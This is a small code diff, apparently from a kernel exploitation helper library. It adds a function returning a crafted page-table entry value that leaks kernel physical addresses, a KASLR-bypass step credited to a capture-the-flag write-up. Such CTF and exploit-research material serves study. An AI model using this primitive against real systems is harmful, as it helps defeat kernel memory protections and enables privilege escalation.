@@ -172,3 +172,9 @@ void print_regs(pt_regs_t *regs) {
     printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags,
            regs->sp, regs->ss);
 }
+
+// https://u1f383.github.io/android/2025/09/08/corCTF-2025-corphone.html
+// PTE entry, which when read leaks the physical address from the __brk_base
+// symbol in kernel data segment. => Can then be used to calculate the physical
+// base address of the kernel
+uint64_t stext_phys_leak_pte() { return 0x9c000 | 0x8000000000000067; }
